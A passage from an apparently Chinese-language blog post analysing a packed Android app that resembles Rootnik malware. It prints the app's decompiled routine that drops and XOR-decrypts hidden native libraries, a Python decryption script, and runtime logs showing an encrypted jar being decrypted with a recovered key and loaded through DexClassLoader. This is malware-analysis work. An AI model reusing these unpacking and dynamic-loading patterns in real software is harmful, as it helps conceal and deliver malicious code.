-&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;private static void xtmltaqolx(int asdEw, int ggplklssfq, int kzpjmjnwdg, int qziqcjievs) {
-    File filespath = new File(xzbs_ibq.getFilesDir().getAbsolutePath() + &amp;quot;/&amp;quot; + nwm_tau);
-    if (filespath.exists()) {
-        filespath.delete();
-        filespath.mkdirs();
-    } else {
-        filespath.mkdirs();
-    }
-    try {
-        for (String sofile : xzbs_ibq.getAssets().list(nwm_tau)) {
-            InputStream is = xzbs_ibq.getAssets().open(&amp;quot;wrhlrci/&amp;quot; + sofile);
-            FileOutputStream fos = new FileOutputStream(new File(filespath, sofile));
-            byte[] data = new byte[1024];
-            while (true) {
-                int i = is.read(data);
-                if (i == -1) {
-                    break;
-                }
-                fos.write(data, 0, i);
-            }
-            fos.close();
-            is.close();
-        }
-    } catch (Exception e) {
-        e.printStackTrace();
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;后面三个函数的逻辑较为简单，除去 junk code 发现其实三个函数执行的是一个功能，将 &lt;code&gt;libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 解密并完成之前所说的写入 files 文件夹下的功能。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;private static int hwfhcg_uyf = 0;
-private static byte[] ytukd_pkq = new byte[40960];
-
-private static void aozftlu() throws IOException {
-    hwfhcg_uyf = new FileInputStream(dyozzxjqf()).read(ytukd_pkq) / 2;
-}
-
-private static void lfob() throws IOException {
-    for (int i = 0; i &amp;lt; hwfhcg_uyf; i++) {
-        byte[] bArr = ytukd_pkq;
-        bArr[i] = (byte) (bArr[i] ^ ytukd_pkq[hwfhcg_uyf + i]);
-    }
-}
-
-private static void tevwztzyjqace() throws IOException {
-    new FileOutputStream(ozxzzjhyypbi()).write(ytukd_pkq, 0, hwfhcg_uyf);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到 apk 包中存储的其实是加密过的 so 文件，真正的 &lt;code&gt;libswbqgonYxEgdlSXzbootstrap.so&lt;/code&gt; 文件是由该文件的前半部分和后半部分异或而成的。&lt;/p&gt;
-
-&lt;p&gt;我们可以从 root 的 Android 手机上提取解密后的 so 文件，或者是编写 python 脚本来进行解密：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;data = file(&#39;libswbqgonYxEgdlSXzbootstrap.so&#39;, &#39;rb&#39;).read()
-mid = len(data) / 2
-so = [chr(ord(i) ^ ord(j)) for i, j in zip(data[:mid:], data[mid::])]
-with open(&#39;true.so&#39;, &#39;w&#39;) as f:
-    f.write(so)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;然后我们可以看到存在这样一行代码： &lt;code&gt;umnyoz(324, 6, false, 6);&lt;/code&gt;，会动态加载相应 so 文件。至此，Java 端的加密/解密部分已经结束了，我们可以发现 Java 端的操作就是解密并释放 assets 和 lib 文件夹下的 so 文件，然后通过 &lt;code&gt;System.load()&lt;/code&gt; 函数进行加载。&lt;/p&gt;
-
-&lt;h2 id=&#34;native&#34;&gt;Native&lt;/h2&gt;
-
-&lt;p&gt;但仅有这些操作是不够的，我们有足够的理由相信在 so 文件里还存在着加壳的部分逻辑，使用 ida 打开相应文件，找到 &lt;code&gt;JNI_Onload&lt;/code&gt; 函数：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/jni_onload.png&#34; alt=&#34;JNI_Onload&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;现在可以确认 &lt;code&gt;JNI_Onload&lt;/code&gt; 函数里有加壳的逻辑操作，因此我们需要继续理解该函数。不过幸运的是，我们可以看到代码里加入了很多的 log 函数，我们可以使用这些输出的 log 加深我们对程序逻辑的理解。&lt;/p&gt;
-
-&lt;p&gt;这里截取部分 log：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: JNI_OnLoad
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: Got JNIEnv
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: 00
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: Got Context true
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: after setJavaObjectForDebug
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  1
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  1.1
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  1
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  2
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: adn/suflej/fvvhmduk
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  2.1
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getOutDexDir
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: ()Ljava/lang/String;
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  2.2
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  3
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: g_lib_dir /data/user/0/aaa.bbb.ccc/files/wrhlrci
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  2
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getNames:  4
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: join: libIQPFsmOUChmkwhbDdynamicloader.so
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: join: IQPFsmOUChmkwhbDdynamicloader.so
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: join: IQPFsmOUChmkwhbDdynamicloader.jar
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: so=libIQPFsmOUChmkwhbDdynamicloader.so, dex=IQPFsmOUChmkwhbDdynamicloader.jar
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: if (getNames()) is false
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: 2so=libIQPFsmOUChmkwhbDdynamicloader.so, dex=IQPFsmOUChmkwhbDdynamicloader.jar
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: decrypt
-03-22 04:41:27.272 28000-28000/? E/sa_bootstrap: getLibDir:  1
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: g_lib_dir /data/user/0/aaa.bbb.ccc/files/wrhlrci
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /libIQPFsmOUChmkwhbDdynamicloader.so
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/wrhlrci/libIQPFsmOUChmkwhbDdynamicloader.so
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /IQPFsmOUChmkwhbDdynamicloader.jar
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/IQPFsmOUChmkwhbDdynamicloader.jar
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: src=https://syang-ng.github.io/data/user/0/aaa.bbb.ccc/files/wrhlrci/libIQPFsmOUChmkwhbDdynamicloader.so, out=/data/user/0/aaa.bbb.ccc/files/IQPFsmOUChmkwhbDdynamicloader.jar
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: join: 53_81_64_77_28
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: key = 53_81_64_77_28
-03-22 04:41:27.273 28000-28000/? E/sa_bootstrap: dexclassloader
-03-22 04:41:27.274 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/
-03-22 04:41:27.274 28000-28000/? E/sa_bootstrap: join: /data/user/0/aaa.bbb.ccc/files/IQPFsmOUChmkwhbDdynamicloader.jar
-03-22 04:41:27.430 28000-28000/? E/sa_bootstrap: load success
-03-22 04:41:27.430 28000-28000/? E/sa_bootstrap: dexclassloader2
-03-22 04:41:28.596 28000-28000/aaa.bbb.ccc E/sa_bootstrap: end JNI_OnLoad
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;根据 log 我们就能很明显地发现程序会将之前存在 &lt;code&gt;/files/wrhlrci&lt;/code&gt; 下的几个 so 文件释放到 &lt;code&gt;/files&lt;/code&gt; 文件夹下，并将后缀名改为 &lt;code&gt;.jar&lt;/code&gt;。随意打开其中任意两个文件进行比较，可以发现存在着很明显的差异，这里释放的 jar 文件其实就是 apk 的变体，而 so 文件很明显是一段无意义的数据，显然二者间的转换过程也必然存在着一个解密的过程。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/compare.png&#34; alt=&#34;比较&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;使用 ida 继续逆向源码，很容易地就找到了相应的代码：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/decrypt.png&#34; alt=&#34;Decrpyt&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;继续查看相应源码，可以看到 &lt;code&gt;decrypt&lt;/code&gt; 函数的具体实现，可以看到其会从 so 文件中加载解密的密钥，再通过该密钥解密 so 文件。由于 log 的存在，我们很容易就能发现 &lt;code&gt;key = 53_81_64_77_28&lt;/code&gt;。然后 while 函数里主要就是利用 key 对密文进行解密。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/Reverse-An-Android-App/decrypt2.png&#34; alt=&#34;Decrpyt 2&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;JNI_Onload&lt;/code&gt; 函数最后会调用 &lt;code&gt;com.nativedroid.module.dynamicloader.Dynamic&lt;/code&gt; 的 &lt;code&gt;start&lt;/code&gt; 函数，但令人奇怪的是 apk 文件中其实并无该库，所以这就是 apk 最后执行失败的原因？&lt;/p&gt;
-
-&lt;p&gt;可以发现该 app 和 &lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-i.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant&lt;/a&gt; 一文描述的还是比较相像的，本质上还是用了一堆对抗技术的加壳恶意软件，但壳的难度和商业级别的壳比较还是远远不如。&lt;/p&gt;
-
-&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
-
-&lt;p&gt;虽然头一天晚上看代码看的还是毫无头绪，不过在理解了其背后的逻辑之后，颇有种豁然开朗之感。这大概就是佛家所说的顿悟？&lt;/p&gt;
-
-&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-i.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant, Part I&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.fortinet.com/blog/threat-research/unmasking-android-malware-a-deep-dive-into-a-new-rootnik-variant-part-ii.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Unmasking Android Malware: A Deep Dive into a New Rootnik Variant, Part II&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
 </description>
     </item>
     
